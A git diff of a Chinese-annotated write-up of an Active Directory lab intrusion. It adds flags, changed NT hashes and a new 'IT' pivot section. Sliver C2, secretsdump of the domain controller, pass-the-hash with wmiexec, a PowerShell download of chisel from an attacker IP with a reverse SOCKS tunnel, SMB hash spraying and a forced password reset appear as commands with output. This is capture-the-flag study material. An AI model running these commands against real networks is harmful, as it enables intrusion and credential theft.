@@ -951,7 +951,9 @@ root
 
 root@s021v010:~# ss -lnt
 ```
-
+```
+VL{4ef82613f8d4296ab4bee1a8c48015ab}
+```
 ```
 root@s021v010:~# docker ps
 CONTAINER ID   IMAGE                              COMMAND            CREATED        STATUS                  PORTS                                                                                    NAMES
@@ -1285,7 +1287,7 @@ Reconnect Interval: 1m0s
 ```
 
 ```bash
-[server] sliver (wutai-http) > execute-assembly -i -s /home/kali/Downloads/SharpHound.exe -- -c all,gpolocalgroup -d eu.junon.vl
+[server] sliver (wutai-http) > execute-assembly -i -s /home/kali/Desktop/SharpHound.exe -- -c all,gpolocalgroup -d eu.junon.vl
 
 [server] sliver (wutai-http) > download 20231104105301_wjus0f4t.rzt.zip
 ```
@@ -1558,19 +1560,19 @@ Valid starting       Expires              Service principal
 ```
 
 ```bash
-b287df3a5773605bf91cdb4d5c8abd17bff1e29cb495fb427449db34b054cb14
+eb225f4d652ed65b20bd64e50c98ed2fb7ad7ef3b27969ee8110970c5f23516a
 
-root@kali:/home/kali/Desktop/PKINITtools-master# proxychains4 -q python3 getnthash.py -key b287df3a5773605bf91cdb4d5c8abd17bff1e29cb495fb427449db34b054cb14 eu.junon.vl/S021M200$
+root@kali:/home/kali/Desktop/PKINITtools-master# proxychains4 -q python3 getnthash.py -key eb225f4d652ed65b20bd64e50c98ed2fb7ad7ef3b27969ee8110970c5f23516a eu.junon.vl/S021M200$
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Using TGT from cache
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
-90d557741822d4a602d5efaed4051ffb
+12975a8a78695dee9f6c66e111e7a085
 ```
 
 ```bash
-proxychains4 -q  impacket-secretsdump -just-dc 'S021M200$'@172.16.21.222 -hashes :90d557741822d4a602d5efaed4051ffb -outputfile eu_junon.hashes
+proxychains4 -q  impacket-secretsdump -just-dc 'S021M200$'@172.16.21.222 -hashes :12975a8a78695dee9f6c66e111e7a085 -outputfile eu_junon.hashes
 
 proxychains4 -q impacket-wmiexec administrator@172.16.21.222 -hashes :ea2c613e21c9c999e7a1e19e0136427e
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1583,5 +1585,65 @@ eu-junon\administrator
 
 C:\Users>type C:\Users\Administrator\Desktop\root.txt
 VL{388912a5b7433a36fe332c3f17cf85c6}
+```
+
+IT
+
+```bash
+netstat -ano | findstr "UDP"
+172.16.22.222:53
+
+发现22网段
+
+但是貌似通过之前的172.16.20.50:8080 无法访问
+
+尝试了sliver自带的socks5 不太稳定
+
+powershell -c "iwr http://10.8.0.227:8000/chisel.exe -usebasicparsing -outfile chisel.exe"
+
+./chisel server -p 9001 --reverse
+
+chisel.exe client 10.8.0.227:9001 R:socks
+```
+
+```bash
+proxychains4 -q ./nxc smb 172.16.22.3-254
+SMB         172.16.22.200   445    S022M100         [*] Windows Server 2022 Standard 20348 x64 (name:S022M100) (domain:it.wutai.vl) (signing:True) (SMBv1:True)
+SMB         172.16.22.250   445    S022M110         [*] Windows 10.0 Build 20348 x64 (name:S022M110) (domain:wutai.vl) (signing:True) (SMBv1:False)
+```
+
+```bash
+密码喷洒
+
+proxychains4 -q ./nxc smb 172.16.22.200 -u Kerry.Forster -H ea21b1d3ca228dc4c96cd591246ffcfe --continue-on-success
+SMB         172.16.22.200   445    S022M100         [*] Windows Server 2022 Standard 20348 x64 (name:S022M100) (domain:it.wutai.vl) (signing:True) (SMBv1:True)
+SMB         172.16.22.200   445    S022M100         [-] it.wutai.vl\Kerry.Forster:ea21b1d3ca228dc4c96cd591246ffcfe STATUS_PASSWORD_MUST_CHANGE
+```
+
+```bash
+proxychains4 -q impacket-smbpasswd it.wutai.vl/Kerry.Forster@172.16.22.200 -hashes :ea21b1d3ca228dc4c96cd591246ffcfe -debug
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+===============================================================================
+  Warning: This functionality will be deprecated in the next Impacket version  
+===============================================================================
+
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+New SMB password: 
+Retype new SMB password: 
+[!] Password is expired, trying to bind with a null session.
+[*] Password was changed successfully.
+
+proxychains4 -q ./nxc smb 172.16.22.200 -u Kerry.Forster -p 'p-0p-0p-0'
+SMB         172.16.22.200   445    S022M100         [*] Windows Server 2022 Standard 20348 x64 (name:S022M100) (domain:it.wutai.vl) (signing:True) (SMBv1:True)
+SMB         172.16.22.200   445    S022M100         [+] it.wutai.vl\Kerry.Forster:p-0p-0p-0
+```
+
+```bash
+ADCS
+http://172.16.22.200/certsrv/
+
+NTLM Relaying to ADCS HTTP Endpoints
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate
 ```
 
